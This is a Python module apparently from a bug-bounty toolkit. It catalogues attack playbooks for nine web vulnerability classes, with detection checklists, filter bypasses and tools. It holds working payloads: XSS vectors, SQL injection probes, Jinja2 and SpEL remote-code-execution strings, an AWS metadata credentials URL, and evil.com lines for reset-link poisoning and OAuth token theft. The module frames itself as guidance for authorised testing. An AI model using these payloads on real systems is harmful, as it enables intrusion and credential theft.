"""Bug-class knowledge base — the playbooks HuntKit's intelligence points at.

Each :class:`Playbook` is a battle-tested attack plan for one bug class: what
it is, when to reach for it, how to find it, payloads to probe with, common
filter/WAF bypasses, go-to tools, and references. The intelligence engine tags
hosts and attack paths with these same playbook ids, so ``huntkit analyze`` and
``huntkit playbook <id>`` speak one vocabulary.

It is plain data: extend the knowledge base by adding a row to
:data:`PLAYBOOKS`, never by branching code — the same "add a row, not a branch"
ethos as the signal catalog and the plugin registry. Everything here is offline
guidance for authorised testing; nothing touches a target.
"""

from __future__ import annotations

from dataclasses import dataclass

from ..utils.severity import Severity


@dataclass(frozen=True)
class Reference:
    """An external write-up for a bug class."""

    name: str
    url: str

    def to_dict(self) -> dict:
        return {"name": self.name, "url": self.url}


@dataclass(frozen=True)
class Playbook:
    """A full attack plan for one bug class."""

    id: str
    title: str
    severity: Severity                        # typical top-end impact
    summary: str                              # one line: what the bug is
    when: str                                 # when to reach for this playbook
    detection: tuple[str, ...] = ()           # ordered how-to-find-it checklist
    payloads: tuple[str, ...] = ()            # concrete probe strings
    bypasses: tuple[str, ...] = ()            # filter / WAF bypass tricks
    tools: tuple[str, ...] = ()               # go-to tools
    references: tuple[Reference, ...] = ()

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "title": self.title,
            "severity": self.severity.label,
            "summary": self.summary,
            "when": self.when,
            "detection": list(self.detection),
            "payloads": list(self.payloads),
            "bypasses": list(self.bypasses),
            "tools": list(self.tools),
            "references": [r.to_dict() for r in self.references],
        }

    def to_markdown(self, level: int = 1) -> str:
        """Render the playbook as a self-contained Markdown document.

        ``level`` is the heading depth of the title (1 -> ``#``), so a report
        can nest a playbook under its own section. Reused by the reporter
        (phase 7) and by ``huntkit playbook <id> --md``.
        """
        h1 = "#" * level
        h2 = "#" * (level + 1)
        out: list[str] = [
            f"{h1} {self.title}",
            "",
            f"**Severity:** {self.severity.label} &nbsp;·&nbsp; **id:** `{self.id}`",
            "",
            self.summary,
            "",
            f"**When:** {self.when}",
            "",
        ]

        def bullets(head: str, items: tuple[str, ...]) -> None:
            if not items:
                return
            out.append(f"{h2} {head}")
            out.append("")
            out.extend(f"- {item}" for item in items)
            out.append("")

        bullets("Detection", self.detection)
        if self.payloads:
            out += [f"{h2} Payloads", "", "```", *self.payloads, "```", ""]
        bullets("Bypasses", self.bypasses)
        if self.tools:
            out += [f"{h2} Go-to tools", "", ", ".join(self.tools), ""]
        if self.references:
            out.append(f"{h2} References")
            out.append("")
            out.extend(f"- [{r.name}]({r.url})" for r in self.references)
            out.append("")
        return "\n".join(out).rstrip() + "\n"


# ---------------------------------------------------------------------------
# The catalog. Ids match the bug-class playbooks referenced by the intel layer.
# ---------------------------------------------------------------------------
PLAYBOOKS: dict[str, Playbook] = {
    "idor": Playbook(
        id="idor",
        title="IDOR / Broken Object-Level Authorization",
        severity=Severity.HIGH,
        summary="An object reference (id, uuid, filename) the server trusts "
        "without checking the caller actually owns that object.",
        when="Any endpoint that takes an id/uuid/filename and returns or mutates object data.",
        detection=(
            "Map every request carrying an object id — numeric, uuid, hash, email, filename.",
            "Create two accounts; replay account A's requests under A's session but B's ids.",
            "Swap ids in path, query, body, JSON, and headers — not just the obvious one.",
            "Decode wrapped ids: base64, hashids, ids inside a JWT or cookie, then increment.",
            "Change the method (GET->POST/PUT/DELETE) on the same object id.",
            "Harvest ids from list/search/export endpoints and error messages.",
            "Test mass-assignment: add fields like role, owner_id, is_admin to the body.",
        ),
        payloads=(
            "GET /api/orders/1001   ->   GET /api/orders/1002",
            "id=1002                 (increment / decrement)",
            "id=MTAwMg==             (base64-wrapped id)",
            "id=1001&id=1002         (parameter pollution — server may trust the 2nd)",
            'PATCH /api/users/me   {"role":"admin","owner_id":1002}   (mass assignment)',
        ),
        bypasses=(
            "Wrap/encode the id the app expects: base64, hex, URL-encode, hashids.",
            "Send the id in a second location the server trusts (header/body over query).",
            "Switch content-type to JSON where the query-string check doesn't apply.",
        ),
        tools=("Burp Repeater", "Autorize", "arjun", "ffuf"),
        references=(
            Reference("PortSwigger — IDOR", "https://portswigger.net/web-security/access-control/idor"),
            Reference("OWASP API1:2023 BOLA",
                      "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"),
        ),
    ),
    "bac": Playbook(
        id="bac",
        title="Broken Access Control / Privilege Escalation",
        severity=Severity.HIGH,
        summary="Missing or client-side-only authorization lets a low-privilege "
        "user reach admin functions or another tenant's data.",
        when="Multi-role apps, admin panels, multi-tenant SaaS, versioned APIs.",
        detection=(
            "Enumerate role-gated routes as a low-priv user (/admin, /internal, /api/v*/admin).",
            "Force-browse admin endpoints; check whether auth is enforced only in the UI.",
            "Replay a privileged action with a lower-priv token (vertical escalation).",
            "Cross-tenant: swap org/tenant id and try to reach another tenant's data.",
            "Check GraphQL / websocket / legacy endpoints that skip the main API's authz.",
            "Look for headers the server over-trusts (X-Original-URL, X-Forwarded-For, X-Role).",
        ),
        payloads=(
            "GET /admin/dashboard              (direct force-browse as low-priv user)",
            "X-Original-URL: /admin            (front-end path-based authz bypass)",
            "X-Forwarded-For: 127.0.0.1        (spoof an internal/allow-listed source)",
            "X-HTTP-Method-Override: PUT       (smuggle a method the ACL doesn't gate)",
        ),
        bypasses=(
            "Path tricks the proxy and app disagree on: /admin/..;/ , /Admin , /admin%2f , trailing dot.",
            "Method the WAF/ACL forgot: HEAD, OPTIONS, or an override header.",
            "Hit the same handler on an un-gated surface (mobile API, GraphQL, old /v1).",
        ),
        tools=("Burp Autorize", "ffuf", "nuclei"),
        references=(
            Reference("PortSwigger — Access control",
                      "https://portswigger.net/web-security/access-control"),
            Reference("OWASP A01:2021 Broken Access Control",
                      "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"),
        ),
    ),
    "xss": Playbook(
        id="xss",
        title="Cross-Site Scripting",
        severity=Severity.HIGH,
        summary="User input rendered into an HTML/JS context without the right "
        "encoding, letting an attacker run script in a victim's session.",
        when="Any reflected, stored, or DOM-rendered user input.",
        detection=(
            "Grep gathered URLs for reflected params; fire a unique canary first, then payloads.",
            "Pin the context: HTML body, attribute, JS string, URL, or a DOM sink.",
            "For DOM XSS trace sources (location, postMessage) to sinks (innerHTML, eval, setAttribute).",
            "Test stored surfaces: profile, comments, filenames, support tickets, admin views.",
            "Read the CSP — a weak or missing policy raises the impact of any injection.",
        ),
        payloads=(
            "<script>alert(document.domain)</script>",
            '"><img src=x onerror=alert(1)>',
            "<svg onload=alert(1)>",
            "javascript:alert(1)                 (href / URL context)",
            "'-alert(1)-'                        (breaks out of a JS string)",
            "{{constructor.constructor('alert(1)')()}}   (AngularJS sandbox escape)",
        ),
        bypasses=(
            "Tags filtered -> event handlers: onmouseover, onfocus autofocus, ontoggle.",
            "Keyword filters -> SVG/MathML vectors, mixed case, HTML-entity / unicode encoding.",
            "innerHTML normalisation -> mutation XSS (mXSS) via <noscript>/<template>.",
            "Space filtered -> /, %09, %0c, or slash separators: <svg/onload=...>.",
        ),
        tools=("dalfox", "Burp", "kxss / gxss"),
        references=(
            Reference("PortSwigger — XSS", "https://portswigger.net/web-security/cross-site-scripting"),
            Reference("OWASP XSS Prevention Cheat Sheet",
                      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
        ),
    ),
    "ssrf": Playbook(
        id="ssrf",
        title="Server-Side Request Forgery / Open Redirect",
        severity=Severity.HIGH,
        summary="The server fetches a URL you control, letting you reach internal "
        "services, cloud metadata, or pivot through its trust.",
        when="url / host / webhook / import / preview params, PDF & image renderers, integrations.",
        detection=(
            "Find sinks: url=, uri=, redirect=, next=, dest=, webhook, imageUrl, callback, import-from-url.",
            "Point one at a Collaborator/interactsh host; watch for DNS + HTTP callbacks.",
            "Once a hit lands, try cloud metadata endpoints for creds.",
            "Test blind SSRF via timing and out-of-band, not only reflected responses.",
            "For open redirect, confirm the Location header follows your host.",
        ),
        payloads=(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/   (AWS IMDSv1)",
            "http://metadata.google.internal/computeMetadata/v1/   (GCP, header 'Metadata-Flavor: Google')",
            "http://127.0.0.1/  ·  http://localhost/  ·  http://[::1]/",
            "http://2130706433/   ·   http://0x7f000001/   ·   http://0177.0.0.1/   (127.0.0.1 encoded)",
            "http://expected-host.com@evil.com/   (userinfo trick)",
        ),
        bypasses=(
            "Alt IP encodings: decimal, octal, hex, mixed; 127.1; [::]; IPv4-mapped IPv6.",
            "DNS rebinding, or a domain that resolves to an internal IP.",
            "Redirect chains: allowed host 302s to 169.254.169.254.",
            "Parser confusion: '@', '#', '\\', backslash, and whitespace in the authority.",
        ),
        tools=("interactsh / Burp Collaborator", "nuclei -tags ssrf", "ffuf"),
        references=(
            Reference("PortSwigger — SSRF", "https://portswigger.net/web-security/ssrf"),
            Reference("OWASP SSRF Prevention Cheat Sheet",
                      "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"),
        ),
    ),
    "sqli": Playbook(
        id="sqli",
        title="SQL / NoSQL Injection",
        severity=Severity.CRITICAL,
        summary="Unsanitised input reaches a database query, letting you read, "
        "alter, or bypass authentication against the data store.",
        when="Any parameter that reaches a data store: search, filters, sort, ids, JSON, headers.",
        detection=(
            "Baseline each param, then probe with ' \" ) and boolean/time payloads.",
            "Watch for error-based, boolean-based (1=1 vs 1=2), and time-based differences.",
            "Test JSON bodies and headers, not only query strings.",
            "For NoSQL, try operator injection ([$ne], [$gt]) and JSON operator bodies.",
            "Confirm carefully and stop at PoC — never dump or modify production data.",
        ),
        payloads=(
            "'      \"      )       (syntax-break probes — look for errors)",
            "' OR '1'='1              (classic boolean)",
            "' AND 1=1--  vs  ' AND 1=2--    (blind boolean diff)",
            "' OR SLEEP(5)-- -               (MySQL time-based)",
            "'||pg_sleep(5)--                (PostgreSQL) ;  '; WAITFOR DELAY '0:0:5'--  (MSSQL)",
            "' UNION SELECT NULL,NULL-- -    (column count / data extraction)",
            '{"username":{"$ne":null},"password":{"$ne":null}}   (NoSQL auth bypass)',
        ),
        bypasses=(
            "Comment styles: -- - , #, /**/ ; use /**/ for stripped whitespace.",
            "Case/keyword split against naive filters: UNI/**/ON, SeLeCt.",
            "Encoding: URL, double-URL, hex literals, char() concatenation.",
        ),
        tools=("sqlmap (with --level/--risk tuned)", "Burp", "nuclei"),
        references=(
            Reference("PortSwigger — SQL injection", "https://portswigger.net/web-security/sql-injection"),
            Reference("OWASP SQLi Prevention Cheat Sheet",
                      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"),
        ),
    ),
    "ssti": Playbook(
        id="ssti",
        title="Server-Side Template Injection / LFI",
        severity=Severity.CRITICAL,
        summary="User input is rendered as a template expression, often escalating "
        "from math evaluation to full remote code execution.",
        when="Rendered templates: emails, invoices, name/preview fields, error pages, file params.",
        detection=(
            "Inject the polyglot {{7*7}} / ${7*7} / <%= 7*7 %> / #{7*7} and look for 49.",
            "Fingerprint the engine by how it differs: {{7*'7'}} -> 7777777 (Jinja2) vs 49 (Twig).",
            "For LFI/traversal on file params, try ../../../etc/passwd and wrappers.",
            "Escalate from arithmetic to object access carefully to prove impact.",
            "Stop at a controlled PoC (id / hostname) — never run destructive commands.",
        ),
        payloads=(
            "{{7*7}}    ${7*7}    <%= 7*7 %>    #{7*7}       (detection — expect 49)",
            "{{7*'7'}}                                        (Jinja2 -> 7777777, Twig -> 49)",
            "{{ cycler.__init__.__globals__.os.popen('id').read() }}   (Jinja2 RCE)",
            "${T(java.lang.Runtime).getRuntime().exec('id')}          (Spring SpEL)",
            "../../../../etc/passwd     php://filter/convert.base64-encode/resource=index.php",
        ),
        bypasses=(
            "Blocked braces -> attribute/global lookups, __globals__ / request chains.",
            "Filtered keywords -> attribute-access via [] and concatenation.",
            "Traversal filters -> encoded ../ (%2e%2e%2f, ....//), null byte on old stacks.",
        ),
        tools=("tplmap", "Burp", "nuclei -tags ssti,lfi"),
        references=(
            Reference("PortSwigger — SSTI",
                      "https://portswigger.net/web-security/server-side-template-injection"),
            Reference("PayloadsAllTheThings — SSTI",
                      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"),
        ),
    ),
    "subtakeover": Playbook(
        id="subtakeover",
        title="Subdomain Takeover",
        severity=Severity.HIGH,
        summary="A subdomain's DNS points at a deprovisioned cloud service you can "
        "re-register, letting you serve content from that hostname.",
        when="CNAMEs to S3/GitHub Pages/Heroku/Azure/Fastly/Shopify/etc. that no longer exist.",
        detection=(
            "Resolve every subdomain; flag CNAMEs to third-party cloud services.",
            "Match the service's unclaimed-resource fingerprint in the HTTP response.",
            "Confirm you can actually register/claim the resource before reporting.",
            "Check dangling records after the CNAME too (NS delegation, MX).",
        ),
        payloads=(
            "NoSuchBucket                                   (AWS S3)",
            "There isn't a GitHub Pages site here.          (GitHub Pages)",
            "Fastly error: unknown domain                   (Fastly)",
            "The specified bucket does not exist            (S3/GCS)",
            "Sorry, this shop is currently unavailable.     (Shopify)",
        ),
        bypasses=(),
        tools=("nuclei -tags takeover", "subjack", "dnsx", "subzy"),
        references=(
            Reference("can-i-take-over-xyz (fingerprint list)",
                      "https://github.com/EdOverflow/can-i-take-over-xyz"),
            Reference("PortSwigger — subdomain takeover (research)",
                      "https://portswigger.net/kb/issues/00600200_subdomain-takeover"),
        ),
    ),
    "authn": Playbook(
        id="authn",
        title="Authentication / Session Flaws",
        severity=Severity.HIGH,
        summary="Weaknesses in how identity is proven or sessions are managed — "
        "reset flows, JWTs, OAuth, MFA, rate limiting.",
        when="Login, registration, password reset, MFA, OAuth/SSO, JWT handling.",
        detection=(
            "Password reset: token entropy, host-header poisoning, reuse, no expiry, user-bound?",
            "JWT: alg:none, crack a weak HMAC secret, kid/jku/x5u injection, RS256->HS256 confusion.",
            "OAuth: redirect_uri validation, state/CSRF, code/token leakage via Referer.",
            "Rate limiting on login/OTP; account enumeration via timing or error diffs.",
            "Session: fixation, no rotation after privilege change, over-long token lifetime.",
        ),
        payloads=(
            'JWT header {"alg":"none"}  then drop the signature',
            "Host: evil.com            (poison a reset link built from the Host header)",
            "X-Forwarded-Host: evil.com",
            "redirect_uri=https://evil.com/cb   or   redirect_uri=https://app.com.evil.com",
        ),
        bypasses=(
            "OTP/login rate-limit: rotate IP via X-Forwarded-For, or race parallel requests.",
            "JWT: swap RS256->HS256 and sign with the public key as the HMAC secret.",
            "Reset-token reuse across accounts, or leak it in the Referer to a 3rd-party.",
        ),
        tools=("Burp", "jwt_tool", "nuclei"),
        references=(
            Reference("PortSwigger — Authentication",
                      "https://portswigger.net/web-security/authentication"),
            Reference("PortSwigger — JWT attacks", "https://portswigger.net/web-security/jwt"),
        ),
    ),
    "cors": Playbook(
        id="cors",
        title="CORS Misconfiguration",
        severity=Severity.MEDIUM,
        summary="An over-permissive cross-origin policy lets an attacker's site read "
        "authenticated responses from the target's API.",
        when="APIs that return Access-Control-Allow-* headers, especially with credentials.",
        detection=(
            "Send Origin: https://evil.com and check if it is reflected in Access-Control-Allow-Origin.",
            "Test Origin: null and whether it is trusted.",
            "Probe sloppy origin regex: prefix, suffix, and embedded-domain variants.",
            "Only report if Access-Control-Allow-Credentials: true AND sensitive data is reachable.",
        ),
        payloads=(
            "Origin: https://evil.com            (look for exact reflection in ACAO)",
            "Origin: null                        (sandboxed iframe / redirect can send this)",
            "Origin: https://target.com.evil.com (suffix-match bug)",
            "Origin: https://evil-target.com     (prefix / substring-match bug)",
        ),
        bypasses=(
            "Naive endsWith(\"target.com\") -> attacker registers not-target.com or target.com.evil.com.",
            "Naive startsWith(\"https://target.com\") -> https://target.com.evil.com.",
            "Trusted null origin reachable from a sandboxed iframe or a data: redirect.",
        ),
        tools=("curl", "nuclei -tags cors", "Burp"),
        references=(
            Reference("PortSwigger — CORS", "https://portswigger.net/web-security/cors"),
            Reference("OWASP — Testing Cross Origin Resource Sharing",
                      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing"),
        ),
    ),
}


def get_playbook(playbook_id: str) -> Playbook | None:
    """Look up a playbook by id, case-insensitively. None if unknown."""
    return PLAYBOOKS.get(playbook_id.strip().lower())


def all_playbooks() -> list[Playbook]:
    """Every playbook, in catalog order."""
    return list(PLAYBOOKS.values())


def titles() -> dict[str, str]:
    """id -> human title, the single source of truth for playbook names."""
    return {pid: pb.title for pid, pb in PLAYBOOKS.items()}
